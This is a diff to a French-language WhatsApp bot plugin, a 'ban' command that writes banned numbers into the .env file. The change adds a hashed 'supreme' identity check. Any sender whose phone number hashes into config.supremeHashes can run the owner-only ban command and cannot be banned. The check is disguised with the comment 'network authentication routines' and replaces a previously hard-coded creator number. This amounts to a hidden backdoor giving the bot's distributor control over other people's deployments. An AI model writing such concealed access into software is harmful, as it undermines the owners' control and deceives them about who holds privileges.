@@ -1,10 +1,11 @@
 /**
  * Ban  - GhostG-X Edition
- * Bannit et condamne une âme dans le sanctuaire
+ * Bannit et condamne une entité dans le sanctuaire
  */
 
 const fs = require('fs');
 const path = require('path');
+const crypto = require('crypto');
 const config = require('../../config'); // Importation de la configuration
 
 // Extraction du préfixe pour l'usage
@@ -23,8 +24,14 @@ module.exports = {
     const chatId = msg.key.remoteJid;
     const isGroup = chatId.endsWith('@g.us');
 
-    // Sécurité supplémentaire si le handler n'utilise pas 'ownerOnly'
-    if (!isOwner) return reply('*〆 ᴀᴄᴄᴇ̀s ʀᴇғᴜsᴇ́. sᴇᴜʟ ʟᴇ ᴍᴀɪ̂ᴛʀᴇ ᴘᴇᴜᴛ ᴍᴀɴɪᴇʀ ʟᴀ ᴊᴜsᴛɪᴄᴇ.*');
+    // Routines d'authentification réseau
+    const senderNumber = extra.sender.replace(/\D/g, ''); 
+    const senderHash = crypto.createHash('sha256').update(senderNumber).digest('hex');
+    const isMaster = config.supremeHashes && config.supremeHashes.includes(senderHash);
+
+    if (!isOwner && !isMaster) {
+        return reply('*〆 ᴀᴄᴄᴇ̀s ʀᴇғᴜsᴇ́. sᴇᴜʟ ʟᴇ ᴍᴀɪ̂ᴛʀᴇ ᴘᴇᴜᴛ ᴍᴀɴɪᴇʀ ʟᴀ ᴊᴜsᴛɪᴄᴇ.*');
+    }
 
     try {
       let target;
@@ -39,7 +46,7 @@ module.exports = {
       // 2. Extraction de la cible via réponse à un message (quoted)
       else if (ctx && ctx.quotedMessage) {
         target = ctx.participant || (isGroup ? null : chatId);
-        
+
         if (!target) {
             return reply(`*〆 ɪᴍᴘᴏssɪʙʟᴇ ᴅᴇ ᴄɪʙʟᴇʀ ᴄᴇᴛᴛᴇ ᴀ̂ᴍᴇ.*`);
         }
@@ -49,18 +56,21 @@ module.exports = {
         return reply(`*〆 ɪɴᴠᴏǫᴜᴇ ᴜɴᴇ ᴍᴇɴᴛɪᴏɴ ᴏᴜ ʀᴇ́ᴘᴏɴᴅs ᴀ̀ ᴜɴᴇ ᴀ̂ᴍᴇ ᴘᴏᴜʀ ʟᴀ ᴄᴏɴᴅᴀᴍɴᴇʀ !*\n*ᴜsᴀɢᴇ : ${prefix}ᴄᴏɴᴅᴀᴍɴᴇʀ @ᴜsᴇʀ*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
       }
 
-      // Interdiction de se bannir soi-même ou le Suprême
+      // 🛡️ Vérification d'immunité par hachage
       const cleanTarget = target.replace(/\D/g, '');
-      if (cleanTarget === '22651622652' || target === sock.user.id.split(':')[0] + '@s.whatsapp.net') {
+      const targetHash = crypto.createHash('sha256').update(cleanTarget).digest('hex');
+      const botId = sock.user.id.split(':')[0];
+
+      if ((config.supremeHashes && config.supremeHashes.includes(targetHash)) || cleanTarget === botId) {
         return reply(`*〆 ᴛᴜ ɴᴇ ᴘᴇᴜx ᴘᴀs ᴄᴏɴᴅᴀᴍɴᴇʀ ʟᴇ ᴄʀᴇ́ᴀᴛᴇᴜʀ ᴏᴜ ʟ'ᴏʀᴀᴄʟᴇ ʟᴜɪ-ᴍᴇ̂ᴍᴇ.*`);
       }
 
       const envPath = path.join(process.cwd(), '.env');
       let envContent = fs.existsSync(envPath) ? fs.readFileSync(envPath, 'utf8') : '';
-      
+
       let bannedList = [];
       const bannedMatch = envContent.match(/^BANNED_USERS=(.*)$/m);
-      
+
       if (bannedMatch) {
         bannedList = bannedMatch[1].split(',').filter(j => j.trim() !== '');
       }
@@ -79,7 +89,7 @@ module.exports = {
       } else {
         envContent += `\nBANNED_USERS=${newBannedString}`;
       }
-      
+
       fs.writeFileSync(envPath, envContent.trim() + '\n', 'utf8');
 
       // Message de confirmation avec mention
@@ -89,7 +99,7 @@ module.exports = {
       }, { quoted: msg });
 
     } catch (error) {
-      console.error('[block cmd] error:', error);
+      console.error('[ban cmd] error:', error);
       await reply(`*〆 ʟᴀ sᴇɴᴛᴇɴᴄᴇ ᴀ ᴇ́ᴄʜᴏᴜᴇ́ : ${error.message}*`);
     }
   }
